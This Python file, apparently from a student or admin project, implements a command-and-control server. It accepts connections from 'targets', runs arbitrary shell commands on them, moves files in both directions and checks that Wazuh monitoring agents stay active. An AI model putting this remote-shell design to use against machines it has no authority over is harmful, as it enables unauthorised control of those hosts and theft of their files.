"""
 File: c2.py
 Description: file which implement Command&Control Server logic
 Designed by: Pasa Larisa

 Module-History:
    3. Added heartbeat functionality to  ensures the persistence of the active state of wazuh agent and prevents the created solution from crashing.
    2. Added shell() function to send/recv data from/to specified target
    1. Added function to listen for connections in a separate thread + create function for proper start server
"""
import inspect
from datetime import datetime
import socket
import json
import os
import base64
import threading
import logging
from schedule import every, repeat
from constants import *

clients = 0


def shell(target, ip, command):
    """
       Shell function send/receive commands/responses to/from targets.

       Parameters:
       target (socket.socket): The socket details of target
       ip (tuple ip - port) : Ip address of target
       command (string with executable command): Executable command in cmd

       Returns: result - result of command
    """

    def reliable_send(data):
        """
           Send data to the client reliably by encoding to JSON.

           Parameters:
           data : Data to send to target

           Returns: None
        """
        try:
            json_data = json.dumps(data)
            json_data = json_data.encode('utf-8')
            target.send(json_data)
        except Exception as e:
            logging.error(f"[!!][shell()] ERROR while send message to victim: {e}")
            print(f"[!!][shell()] ERROR while send message to victim: {e}")

    def reliable_recv():
        """
            Receive data from the client reliably by decoding from JSON.

            Returns: None
        """
        try:
            data = ""
            while True:
                try:
                    chunk_recv = target.recv(1024).decode()
                    if not chunk_recv or len(chunk_recv) == 0 or chunk_recv == '':
                        break
                    data = data + chunk_recv
                    return json.loads(data)
                except ValueError as e:
                    continue

        except Exception as e:
            logging.error(f"[!!][shell()] ERROR while receiving data from target: {e}")
            print(f"[!!][shell()] ERROR while receiving data from target:  {e}")
            return None

    result = None
    reliable_send(command)

    if command == 'q':
        print("COMANDA Q")

    elif command == "exit":
        print("COMANDA EXIT")
        target.close()
        TARGETS.remove(target)
        IPS.remove(ip)

    elif command.strip().startswith("cd") and len(command.strip()) > 2:
        print("COMANDA CD")

    elif command[:8] == "download":
        with open(command[9:], "wb") as file:
            file_data = reliable_recv()
            file.write(base64.b64decode(file_data))

    elif command[:6] == "upload":
        try:
            with open(command[7:], "rb") as fin:
                reliable_send(base64.b64encode(fin.read()))
        except ValueError:
            failed = "Failed to upload"
            reliable_send(base64.b64encode(failed))
    else:
        print(f"[++] INFO: Waiting for c2_agent response...")
        result = reliable_recv()

    return result


def listening_for_connection():
    """
            Threaded target function which listening constantly for connections

            Returns:
            None
        """
    global clients
    while True:
        if STOP_THREADS is True:
            break
        C2_SOCKET.settimeout(1)
        try:

            target, ip = C2_SOCKET.accept()
            TARGETS.append(target)
            IPS.append(ip)
            connection_message = f"[++] CONNECTED : {str(TARGETS[clients])} -- {str(IPS[clients])}"
            print(f"\n{connection_message}\n")
            logging.info(connection_message)
            clients += 1
        except Exception as e:
            pass


@repeat(every(SCHEDULED_INTERVAL).seconds) #am modificat aici pe variabila
def check_wazuh_agents():
    """
         Periodically check status of agents wazuh from each target

         Returns:
         None
     """
    logging.info("[++][check_wazuh_agents()] INFO: Check Wazuh Agents Status")
    print("[++][check_wazuh_agents()] INFO: Check Wazuh Agents Status")

    length_of_targets = len(TARGETS)
    i = 0
    try:
        while i < length_of_targets:
            target = TARGETS[i]
            ip = IPS[i]
            response = shell(target, ip, CHECK_WAZUH_STATUS)
            print(
                f"AGENT [{ip}] has responded: \n************************************************************************\n{response}\n************************************************************************\n")
            # Here can be multiple states of wazuh-agent: inactive, failed, activating, reloading, maintenance
            # I manage classic state of agent : inactive -> active
            # In some cases agent can be in failed state, but just when is smth wrong configured
            if PREVENTION_STOPPING_AGENT_CHECK not in response:
                logging.info(f"[++][check_wazuh_agents()] INFO: Agent <{ip}> seems to be inactive")
                print(f"[++][check_wazuh_agents()] INFO: Agent <{ip}> seems to be inactive")

                _ = shell(target, ip, ACTIVATE_WAZUH_AGENT)
                response = shell(target, ip, CHECK_WAZUH_STATUS)

                if PREVENTION_STOPPING_AGENT_CHECK not in response:
                    logging.error(f"[!!][check_wazuh_agents()] ERROR: Agent <{ip}> could not be activated.")
                    print(f"[!!][check_wazuh_agents()] ERROR: Agent <{ip}> could not be activated.")

                else:
                    logging.info(f"[++][check_wazuh_agents()] INFO: Agent <{ip}> successfully activated.")
                    print(f"[++][check_wazuh_agents()] INFO: Agent <{ip}> successfully activated.")
            i += 1

    except Exception as e:
        logging.error(f"[!!][check_wazuh_agents()] ERROR Failed to check to all targets: {e}")
        print(f"[!!][check_wazuh_agents()] ERROR Failed to check to all targets: {e}")


def start_server():
    """
        Initiate server socket + start threads for listening and periodically checking state of wazuh agents

        Returns:
        None
    """
    C2_SOCKET.bind((SERVER_ADDRESS, SERVER_PORT))
    C2_SOCKET.listen(5)

    logging.info(f"[SERVER START - {datetime.now()}] : {SERVER_ADDRESS}:{SERVER_PORT}")
    logging.info("[+] INFO: Waiting for targets to connect ... ")
    print("[+] INFO: Waiting for targets to connect ... ")

    listening_thread = threading.Thread(target=listening_for_connection)
    check_wazuh_thread = threading.Thread(target=check_wazuh_agents)

    listening_thread.start()
    check_wazuh_thread.start()


def list_targets():
    """
       Get list of each targets connected to server

       Returns:
       sessions_ips : dictionary with target + ip details
    """
    count = 0
    sessions_ips = {}
    for ip in IPS:
        sessions_ips[count] = ip
        count += 1
    return sessions_ips


def exit_program(listening_thread):
    for target in TARGETS:
        target.close()
    C2_SOCKET.close()
    listening_thread.join()
